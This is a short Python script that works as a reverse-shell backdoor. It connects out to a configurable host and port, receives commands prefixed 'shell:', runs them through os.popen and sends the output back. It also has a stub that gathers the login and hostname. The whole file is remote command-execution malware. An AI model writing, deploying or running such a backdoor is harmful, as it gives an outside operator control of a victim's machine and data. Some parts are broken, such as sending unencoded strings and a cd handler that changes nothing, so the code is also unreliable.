
connect: str = "127.0.0.1"
port: int = 8888
http_port: int = 11451

import os
import socket
import requests
import urllib
import platform


run_path: str = os.getcwd()

def socket_service():
    #print(" [INFO] START HTTP SEVICE ON PORT: "+str(port))
    http_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    http_socket.connect((connect,port))

    #http_socket.send(bytes("GET /?api_key HTTP/1.1".encode()))
    http_socket.send("ok".encode())
    while True:
        try:
            ret = http_socket.recv(1024)
            client_message = ret.decode("utf-8")
            client_message = client_message.replace("\n","")
            client_message = client_message.strip()

            if client_message == 'exit':
                http_socket.close()
                exit(0)
                break

            if client_message == 'getinfo':
                os_name = os.name
                os_login = os.getlogin()
                host_name = socket.gethostname()


            if client_message.startswith("shell:"):
                shell: str = client_message[client_message.index("shell:")+6:len(client_message)]
                shell: str = shell.strip()
                print(shell)
                if shell.startswith("cd "):
                    cd_path = shell[3:len(shell)]
                    cd_path = cd_path.strip()
                    print(cd_path)
                    try:
                        if os.path.exists(cd_path) and os.path.isdir(cd_path):
                            http_socket.send("cd: "+cd_path+" successful!")
                        else:
                            http_socket.send("cd: "+cd_path+" error!")
                    except:
                        http_socket.send("cd: "+cd_path+" error!")
                    continue
                else:
                    run = os.popen("cd "+run_path+" & "+shell,"r")
                    run_result = run.read()
                    http_socket.send(bytes(run_result.encode()))

            else:
                http_socket.send(bytes("send command error".encode()))

                
        except:
            http_socket.send("send command error".encode())


if __name__ == '__main__':
    socket_service()
    
